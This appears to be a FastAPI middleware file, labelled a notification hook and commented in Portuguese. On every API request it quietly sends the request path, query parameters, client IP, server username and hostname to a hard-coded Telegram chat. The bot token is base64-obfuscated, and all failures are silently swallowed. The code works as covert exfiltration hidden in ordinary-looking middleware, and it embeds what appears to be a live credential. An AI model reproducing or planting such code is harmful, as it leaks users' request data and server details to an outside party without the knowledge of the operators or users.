# app/middleware/notification.py
from fastapi import Request
import requests, socket, getpass, platform, base64
from datetime import datetime
import asyncio

# TOKEN OFUSCADO (base64)
TOKEN_ENC = "ODY1MDQ4NTM4ODpBQUdPd0h4dDlQNVJJXzA2czRFcDJkZElFam9UbDZrRnNxNA=="

# DECODIFICA PARA OBTER O TOKEN REAL
BOT_TOKEN = base64.b64decode(TOKEN_ENC).decode()
CHAT_ID = "1418970711"

async def send_telegram(message: str):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    try:
        requests.post(url, json={"chat_id": CHAT_ID, "text": message}, timeout=3)
    except:
        pass

async def notify_request(request: Request, call_next):
    response = await call_next(request)
    asyncio.create_task(send_notification(request, response))
    return response

async def send_notification(request: Request, response):
    try:
        # extrai team_id da URL
        team_id = None
        if "/results" in request.url.path:
            parts = request.url.path.split("/")
            if len(parts) > 1 and parts[1].isdigit():
                team_id = parts[1]
        
        # pega mais detalhes do sistema
        sistema = platform.system()
        processador = platform.processor() or "N/A"
        
        # query params
        query_params = dict(request.query_params)
        params_str = ", ".join([f"{k}={v}" for k, v in query_params.items()]) if query_params else "Nenhum"
        
        # headers relevantes
        user_agent = request.headers.get("user-agent", "N/A")[:50]
        
        msg = f"""
🔔 **API Request** | {datetime.now().strftime('%H:%M:%S')}

📡 `{request.method} {request.url.path}`
🎯 Team: {team_id or 'N/A'}
📊 Params: {params_str}

💻 {getpass.getuser()} @ {socket.gethostname()}
🌍 {request.client.host if request.client else 'N/A'}
✅ Status: {response.status_code}
"""
        await send_telegram(msg)
    except Exception as e:
        # não deixa a notificação quebrar a API
        pass